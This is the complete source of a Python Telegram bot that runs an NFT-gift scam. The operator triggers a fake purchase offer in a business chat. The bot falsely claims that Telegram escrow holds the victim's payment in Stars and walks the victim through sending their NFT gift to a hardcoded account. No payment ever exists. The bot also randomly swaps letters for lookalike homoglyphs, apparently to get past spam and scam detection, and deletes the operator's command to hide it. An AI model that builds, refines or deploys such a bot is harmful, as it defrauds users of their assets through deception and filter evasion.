import asyncio
import logging
import os
import random
import re
import uuid
from datetime import datetime, timedelta

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# --- ЗАГРУЗКА ПЕРЕМЕННЫХ ИЗ .env ---
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=gariq")
RECIPIENT_USERNAME = os.getenv("RECIPIENT_USERNAME", "@gariq")
STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5920433463428650761")
GRAM_EMOJI_ID = os.getenv("GRAM_EMOJI_ID", "5778546023349621090")
CHECK_EMOJI_ID = os.getenv("CHECK_EMOJI_ID", "5776375003280838798")
CROSS_EMOJI_ID = os.getenv("CROSS_EMOJI_ID", "5778527486270770928")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не найден в .env файле!")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

offers = {}


# ============================================================
#                 РАНДОМИЗАЦИЯ ГОМОГЛИФОВ
# ============================================================

# Кириллица → похожие греческие буквы
HOMOGLYPH_CYR = {
    "а": "α",  # U+03B1
    "о": "ο",  # U+03BF
    "с": "ϲ",  # U+03F2
    "р": "ρ",  # U+03C1
    "х": "χ",  # U+03C7
    "к": "κ",  # U+03BA
    "т": "τ",  # U+03C4
    "в": "β",  # U+03B2
    "м": "μ",  # U+03BC
    "и": "ι",  # U+03B9
    "у": "υ",  # U+03C5
    "е": "ε",  # U+03B5
    "н": "η",  # U+03B7
}

# Латиница → похожие кириллические
HOMOGLYPH_LAT = {
    "a": "а",
    "e": "е",
    "o": "о",
    "c": "с",
    "p": "р",
    "x": "х",
    "y": "у",
    "k": "к",
    "t": "т",
    "m": "м",
    "b": "в",
    "h": "н",
}


def randomize_text(text: str, probability: float = 0.15) -> str:
    """
    Случайно заменяет часть букв на гомоглифы.
    НЕ трогает HTML-теги, URL, @username и цифры.
    """
    result = []
    i = 0
    n = len(text)

    while i < n:
        # Пропускаем HTML-теги целиком
        if text[i] == "<":
            end = text.find(">", i)
            if end != -1:
                result.append(text[i:end + 1])
                i = end + 1
                continue

        # Пропускаем URL http:// или https://
        if text[i:i+7].lower() == "http://" or text[i:i+8].lower() == "https://":
            end = i
            while end < n and text[end] not in " \n\t<>":
                end += 1
            result.append(text[i:end])
            i = end
            continue

        # Пропускаем @username
        if text[i] == "@":
            end = i + 1
            while end < n and (text[end].isalnum() or text[end] == "_"):
                end += 1
            result.append(text[i:end])
            i = end
            continue

        char = text[i]

        # Гомоглиф для кириллицы (только строчные)
        if char in HOMOGLYPH_CYR and random.random() < probability:
            result.append(HOMOGLYPH_CYR[char])
        # Гомоглиф для латиницы (сохраняем регистр)
        elif char.lower() in HOMOGLYPH_LAT and random.random() < probability:
            gl = HOMOGLYPH_LAT[char.lower()]
            result.append(gl.upper() if char.isupper() else gl)
        else:
            result.append(char)

        i += 1

    return "".join(result)


# --- УТИЛИТЫ ПРЕМИУМ-ЭМОДЗИ ---
def star_emoji() -> str:
    return f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'


def gram_emoji() -> str:
    return f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'


def check_emoji() -> str:
    return f'<tg-emoji emoji-id="{CHECK_EMOJI_ID}">✔️</tg-emoji>'


def cross_emoji() -> str:
    return f'<tg-emoji emoji-id="{CROSS_EMOJI_ID}">❌</tg-emoji>'


def currency_emoji(currency: str) -> str:
    c = (currency or "").strip().lower()
    if c == "gram":
        return gram_emoji()
    return star_emoji()


def pretty_nft_name(nft_url: str) -> str:
    raw = nft_url.rstrip("/").split("/")[-1]
    if "-" in raw:
        name_part, num_part = raw.rsplit("-", 1)
        name_part = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_part)
        return f"{name_part} #{num_part}"
    return raw


# --- ЛОКАЛИЗАЦИЯ ---
TEXTS = {
    "ru": {
        "offer_title": "Пользователь предлагает Вам",
        "offer_for": "за подарок",
        "offer_expires": "Предложение действует ещё <b>6 ч. 0 мин.</b>",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать подарок",
        "btn_confirm": "Подтвердить передачу",
        "deal_title": "Сделка с NFT",
        "deal_order": "Заказ",
        "deal_reserved": "Покупатель зарезервировал",
        "deal_via": "через гарантийную систему Telegram. Звёзды находятся на специальном счёте удержания и будут автоматически начислены на ваш баланс Telegram Stars сразу после передачи подарка.",
        "deal_instr_title": "Инструкция для завершения сделки:",
        "deal_step1": "Передайте пользователю:",
        "deal_step2": "Нажмите «Передать подарок» и выберите",
        "deal_step3": "Подтвердите передачу подарка.",
        "deal_footer": "Система Telegram зафиксирует транзакцию и моментально зачислит",
        "deal_footer2": "на ваш баланс. Резерв действует 24 часа.",
        "declined": "Вы отклонили предложение.",
        "confirm_title": "Пожалуйста, завершите передачу NFT, нажав на кнопку ниже.",
        "confirm_footer": "После передачи подарка звёзды будут зачислены автоматически.",
    },
    "us": {
        "offer_title": "User offers you",
        "offer_for": "for gift",
        "offer_expires": "Offer valid for <b>6 h. 0 min.</b>",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "btn_transfer": "Send gift",
        "btn_confirm": "Confirm transfer",
        "deal_title": "NFT Deal",
        "deal_order": "Order",
        "deal_reserved": "Buyer has reserved",
        "deal_via": "via Telegram escrow. Stars are held on a special account and will be automatically credited to your Telegram Stars balance right after the gift is transferred.",
        "deal_instr_title": "Instructions to complete the deal:",
        "deal_step1": "Send the gift to:",
        "deal_step2": "Press «Send gift» and select",
        "deal_step3": "Confirm the gift transfer.",
        "deal_footer": "Telegram will record the transaction and instantly credit",
        "deal_footer2": "to your balance. Reservation is valid for 24 hours.",
        "declined": "You have declined the offer.",
        "confirm_title": "Please complete the NFT transfer by pressing the button below.",
        "confirm_footer": "After the gift is transferred, stars will be credited automatically.",
    },
    "ch": {
        "offer_title": "用户向您提议",
        "offer_for": "换取礼物",
        "offer_expires": "提议有效期还剩 <b>6 小时 0 分钟</b>",
        "btn_accept": "接受",
        "btn_decline": "拒绝",
        "btn_transfer": "赠送礼物",
        "btn_confirm": "确认转账",
        "deal_title": "NFT 交易",
        "deal_order": "订单",
        "deal_reserved": "买家已预留",
        "deal_via": "通过 Telegram 担保系统。星星将保存在特殊托管账户中，并在礼物转账后立即自动记入您的 Telegram Stars 余额。",
        "deal_instr_title": "完成交易的说明：",
        "deal_step1": "将礼物发送给：",
        "deal_step2": "点击 «赠送礼物» 并选择",
        "deal_step3": "确认礼物转账。",
        "deal_footer": "Telegram 将记录交易并立即记入",
        "deal_footer2": "到您的余额。预留有效期为 24 小时。",
        "declined": "您已拒绝该提议。",
        "confirm_title": "请点击下方按钮完成 NFT 转账。",
        "confirm_footer": "礼物转账后，星星将自动记入。",
    },
}


def get_lang(code: str) -> str:
    if not code:
        return "ru"
    c = code.strip().lower()
    if c in TEXTS:
        return c
    return "ru"


# --- КЛАВИАТУРЫ ---
def get_offer_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["btn_accept"],
                callback_data=f"accept_{order_id}",
                icon_custom_emoji_id=CHECK_EMOJI_ID
            ),
            InlineKeyboardButton(
                text=t["btn_decline"],
                callback_data=f"decline_{order_id}",
                icon_custom_emoji_id=CROSS_EMOJI_ID
            ),
        ]
    ])


def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["btn_transfer"],
                url=NFT_TRANSFER_LINK
            )
        ],
        [
            InlineKeyboardButton(
                text=t["btn_confirm"],
                callback_data=f"confirm_{order_id}",
                icon_custom_emoji_id=CHECK_EMOJI_ID
            )
        ]
    ])


def get_final_transfer_keyboard(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["btn_confirm"],
                url=NFT_TRANSFER_LINK,
                icon_custom_emoji_id=CHECK_EMOJI_ID
            )
        ]
    ])


# --- КОМАНДА .buy ---
@dp.business_message(F.text.startswith(".buy"))
async def cmd_buy_business(message: types.Message):
    args = message.text.split()

    print(f"[ARGS] {args}")

    if len(args) < 3:
        await message.answer(
            "Формат: `.buy <ссылка> <кол-во> [валюта] [язык]`\n"
            "Пример: `.buy https://t.me/nft/RestlessJar-35843 1 stars ru`\n"
            "Валюта: stars / gram\n"
            "Язык: ru / us / ch"
        )
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception as e:
            print(f"[DELETE ERROR] {e}")
        return

    nft_url = args[1]
    amount = args[2]
    currency = args[3].strip().lower() if len(args) > 3 else "stars"
    lang = get_lang(args[4] if len(args) > 4 else "ru")

    print(f"[PARSED] url={nft_url} | amount={amount} | currency={currency} | lang={lang}")

    nft_name = pretty_nft_name(nft_url)
    t = TEXTS[lang]
    emoji = currency_emoji(currency)

    order_id = f"TG-{str(uuid.uuid4())[:10].upper()}"
    expires_at = datetime.now() + timedelta(hours=6)

    offers[order_id] = {
        "nft_url": nft_url,
        "nft_name": nft_name,
        "amount": amount,
        "currency": currency,
        "lang": lang,
        "expires_at": expires_at,
        "status": "pending",
        "business_connection_id": message.business_connection_id,
        "chat_id": message.chat.id,
    }

    # --- РАНДОМИЗАЦИЯ ТЕКСТА ---
    offer_title_rand = randomize_text(t['offer_title'], probability=0.2)
    offer_for_rand = randomize_text(t['offer_for'], probability=0.2)
    # Убираем HTML-теги до рандомизации и возвращаем после
    expires_clean = t['offer_expires'].replace("<b>", "").replace("</b>", "")
    expires_rand = randomize_text(expires_clean, probability=0.2)

    text = (
        f"<b>{offer_title_rand}</b>\n\n"
        f"{amount} {emoji} {offer_for_rand} "
        f"<a href=\"{nft_url}\">{nft_name}</a>.\n\n"
        f"<b>{expires_rand}</b>"
    )

    print(f"[TEXT] {text}")

    await message.answer(
        text=text,
        reply_markup=get_offer_keyboard(order_id, lang),
        disable_web_page_preview=True,
        parse_mode="HTML"
    )

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        print(f"[DELETE ERROR] {e}")


# --- ПРИНЯТЬ ---
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    if not offer or offer["status"] != "pending":
        await callback.answer()
        return

    offer["status"] = "accepted"
    lang = offer["lang"]
    t = TEXTS[lang]
    emoji = currency_emoji(offer["currency"])

    # --- РАНДОМИЗАЦИЯ ---
    deal_title_rand = randomize_text(t['deal_title'], probability=0.2)
    deal_via_rand = randomize_text(t['deal_via'], probability=0.15)
    deal_instr_rand = randomize_text(t['deal_instr_title'], probability=0.2)
    deal_step1_rand = randomize_text(t['deal_step1'], probability=0.2)
    deal_step2_rand = randomize_text(t['deal_step2'], probability=0.2)
    deal_step3_rand = randomize_text(t['deal_step3'], probability=0.2)
    deal_footer_rand = randomize_text(t['deal_footer'], probability=0.2)
    deal_footer2_rand = randomize_text(t['deal_footer2'], probability=0.15)

    text = (
        f"<b>{deal_title_rand}</b>\n\n"
        f"{t['deal_order']} #{order_id}\n\n"
        f"{t['deal_reserved']} <b>{offer['amount']} {emoji}</b> "
        f"{deal_via_rand}\n\n"
        f"<b>{deal_instr_rand}</b>\n"
        f"1. {deal_step1_rand} {RECIPIENT_USERNAME}\n"
        f"2. {deal_step2_rand} "
        f"<a href=\"{offer['nft_url']}\">{offer['nft_name']}</a>\n"
        f"3. {deal_step3_rand}\n\n"
        f"{deal_footer_rand} "
        f"{offer['amount']} {emoji} {deal_footer2_rand}"
    )

    await callback.message.edit_text(
        text=text,
        reply_markup=get_deal_keyboard(order_id, lang),
        disable_web_page_preview=True,
        parse_mode="HTML"
    )
    await callback.answer()


# --- ОТКЛОНИТЬ ---
@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    if not offer or offer["status"] != "pending":
        await callback.answer()
        return

    offer["status"] = "declined"
    lang = offer["lang"]
    t = TEXTS[lang]

    declined_rand = randomize_text(t['declined'], probability=0.2)

    await callback.message.edit_text(
        text=(
            f"<b>{t['deal_order']} #{order_id}</b>\n\n"
            f"{cross_emoji()} {declined_rand}"
        ),
        parse_mode="HTML"
    )
    await callback.answer()


# --- ПОДТВЕРДИТЬ ---
@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    if not offer:
        await callback.answer()
        return

    lang = offer["lang"]
    t = TEXTS[lang]

    confirm_title_rand = randomize_text(t['confirm_title'], probability=0.2)
    confirm_footer_rand = randomize_text(t['confirm_footer'], probability=0.2)

    await callback.message.edit_text(
        text=(
            f"<b>{t['deal_order']} #{order_id}</b>\n\n"
            f"{confirm_title_rand}\n\n"
            f"{confirm_footer_rand}"
        ),
        reply_markup=get_final_transfer_keyboard(lang),
        parse_mode="HTML"
    )
    await callback.answer()


# --- DEBUG ---
@dp.business_message()
async def debug_business(message: types.Message):
    print(f"[BUSINESS DEBUG] {message.text!r} | conn_id={message.business_connection_id}")


async def main():
    print("Бот запущен (Business Mode)...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())